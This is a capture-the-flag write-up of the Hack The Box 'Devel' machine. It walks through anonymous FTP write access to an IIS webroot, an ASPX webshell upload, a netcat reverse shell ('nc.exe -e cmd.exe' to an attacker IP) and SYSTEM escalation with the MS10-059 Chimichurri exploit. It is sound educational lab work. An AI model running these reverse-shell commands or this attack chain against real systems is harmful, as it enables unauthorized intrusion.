---
title: 'Devel'
target: 'Hack The Box — Devel'
difficulty: 'easy'
date: 2025-09-15
summary: 'An HTB machine — anonymous FTP mapped to the IIS 7.5 webroot on Windows 7, uploading an ASPX webshell for command execution, reverse shell as iis apppool\web via nc.exe, then MS10-059 (Chimichurri) for SYSTEM.'
role: 'pentest'
tags: ['nmap', 'ftp', 'iis', 'asp.net', 'webshell', 'anonymous-ftp', 'zap', 'netcat', 'impacket', 'winpeas', 'ms10-059', 'privilege-escalation', 'windows']
problem: 'A Windows 7 machine with anonymous FTP write access mapped directly to the IIS 7.5 webroot. Files uploaded via FTP are immediately web-accessible, and the host is missing the MS10-059 kernel patch for privilege escalation.'
action: 'Nmap found FTP (21) with anonymous login and IIS 7.5 (80). FTP listing contained aspnet_client, confirming shared webroot. ZAP identified ASP.NET via X-Powered-By header. Uploaded cmdasp.aspx webshell via anonymous FTP and confirmed command execution in the browser. Uploaded nc.exe and obtained a reverse shell as iis apppool\web. WinPEAS identified missing MS10-059 patch — executed Chimichurri exploit for SYSTEM.'
outcome: 'Gained SYSTEM access. Attack chain: ASPX webshell upload via anonymous FTP to IIS webroot, reverse shell as iis apppool\web, MS10-059 Chimichurri for privilege escalation.'
draft: false
---

## Background

Devel is an easy-rated Windows machine that teaches a fundamental web server misconfiguration — anonymous FTP access mapped directly to the web server's document root. The attack chain is straightforward but covers several practical skills: identifying the relationship between two services, uploading a webshell through FTP, pivoting from web-based command execution to an interactive reverse shell, and escalating privileges through a missing kernel patch. Unlike many easy boxes that grant root or SYSTEM through a single exploit, Devel requires both initial access and privilege escalation as separate steps.

---

## Enumeration

An nmap scan against the target reveals two open ports:

![Terminal showing nmap -sV -sC -O scan against 10.129.228.10. Port 21/tcp open with Microsoft ftpd, ftp-syst showing Windows_NT, ftp-anon showing Anonymous FTP login allowed (FTP code 230) with directory listing containing aspnet_client directory (03-18-17), liststar.htm 689 bytes (03-17-17), and welcome.png 184946 bytes (03-17-17). Port 80/tcp open with Microsoft IIS httpd 7.5, http-title IIS7. OS detection guessing Microsoft Windows 7/Vista/2008/Phone 8.1/2012 at 91%.](/writeups/htb-devel/01-nmap-scan.png)

Two services — **FTP on port 21** and **HTTP on port 80**. The nmap output reveals several important details at once: Microsoft ftpd with anonymous login allowed (FTP code 230), a directory listing containing `aspnet_client`, `liststar.htm`, and `welcome.png`, and Microsoft IIS 7.5 serving the default IIS7 welcome page. The OS fingerprint suggests Windows 7 or Server 2008.

The `aspnet_client` folder in the FTP listing is the key finding here. This is a standard directory created by IIS in its webroot — its presence in the FTP directory means the FTP root and the IIS webroot are the same directory. Any file uploaded through anonymous FTP should be directly accessible through the web server.

---

## Web server footprinting

Before uploading anything, confirming the web stack is important. Using ZAP (Zed Attack Proxy) to send a request to the web server and examining the response headers reveals the `X-Powered-By: ASP.NET` header. This confirms the server processes `.aspx` files — meaning an ASP.NET webshell uploaded through FTP will execute when accessed through the browser.

---

## Webshell upload via anonymous FTP

With anonymous FTP write access and an ASP.NET-capable web server sharing the same root directory, the next step is uploading a webshell. `cmdasp.aspx` is a simple ASP.NET command execution page — it provides a text input field and an execute button that runs the supplied command on the server and displays the output.

Uploading the webshell through the anonymous FTP connection and navigating to it in the browser:

![Browser address bar showing 10.129.228.10/cmdasp.aspx with the cmdasp.aspx webshell loaded, displaying a Command: text input field and an execute button.](/writeups/htb-devel/02-cmdasp-webshell.png)

The webshell is accessible and functional. Commands typed into the input field execute on the server and return output in the browser — a web-based command prompt running as the IIS application pool identity.

---

## From webshell to reverse shell

A webshell provides command execution, but it's limited — no interactivity, no ability to run tools that require a proper terminal, and each command is a separate HTTP request. The goal is to upgrade to a proper reverse shell.

Using PowerShell commands through the webshell to explore the filesystem reveals that the FTP directory maps to `C:\inetpub\ftproot`. This confirms the upload path and means additional tools can be transferred through FTP.

The approach for getting a reverse shell: upload `nc.exe` (netcat for Windows) through anonymous FTP, then use the webshell to execute a netcat reverse shell command back to the attacker machine. Setting up an `impacket-smbserver` provides an additional file transfer method for tools that can't go through FTP. Executing the reverse shell command through the webshell:

```
nc.exe -e cmd.exe 10.10.14.x 1234
```

The shell connects back and lands as `iis apppool\web` — the default identity for IIS application pools. This is an unprivileged service account with limited access to the system, so privilege escalation is needed.

---

## Privilege escalation — MS10-059

With an interactive shell as `iis apppool\web`, the next step is identifying a path to SYSTEM. Running **winPEAS** (Windows Privilege Escalation Awesome Scripts) performs an automated enumeration of the system — checking for missing patches, misconfigured services, stored credentials, and other common escalation vectors.

WinPEAS identifies several missing security patches, including **MS10-059** — a vulnerability in the Windows kernel's Tracing Feature for Services that allows local privilege escalation. The exploit for this vulnerability is known as **Chimichurri** — a compiled executable that, when run, spawns a reverse shell as `NT AUTHORITY\SYSTEM`.

Uploading the Chimichurri exploit to the target and executing it with the attacker's IP and a listening port:

```
chimichurri.exe 10.10.14.x 4445
```

A new shell connects back on port 4445 as **NT AUTHORITY\SYSTEM** — full control of the machine. Both the user flag (accessible from the `iis apppool\web` shell) and the administrator flag were retrieved.

---

## What I took from this

Devel's core lesson is about the relationship between services on the same machine. FTP and HTTP are independent protocols serving different purposes, but when they share a filesystem root, a weakness in one directly compromises the other. Anonymous FTP access alone isn't necessarily dangerous — it depends on what directory the FTP server exposes. Anonymous FTP to a documentation folder is benign. Anonymous FTP with write access to a web server's document root is remote code execution. The vulnerability isn't in either service individually — it's in the configuration that ties them together. Identifying this relationship required noticing the `aspnet_client` folder in the FTP listing and understanding what it implied about the directory mapping.

The privilege escalation through MS10-059 follows a standard pattern for Windows kernel exploits: the IIS worker process runs as an unprivileged service account, so the initial shell has limited access. Kernel exploits bypass the user privilege model entirely because they execute in ring 0 — the vulnerability is in the kernel itself, not in a service running as SYSTEM. The practical workflow for finding the escalation path — running winPEAS, identifying missing patches, finding a compiled exploit, uploading and executing it — is the same workflow that applies to most Windows privilege escalation scenarios on older systems. On modern Windows with regular patching, kernel exploits are less common and the escalation vectors shift to misconfigured services, stored credentials, and token manipulation.

The webshell-to-reverse-shell progression is also worth internalizing as a general pattern. A webshell is command execution, but it's constrained by the HTTP request-response model — no persistent session, no interactivity, no job control. Upgrading to a reverse shell through netcat (or PowerShell, or a Meterpreter payload) is almost always the immediate next step after confirming webshell execution, because every subsequent task — enumeration, lateral movement, privilege escalation — benefits from a proper interactive shell.
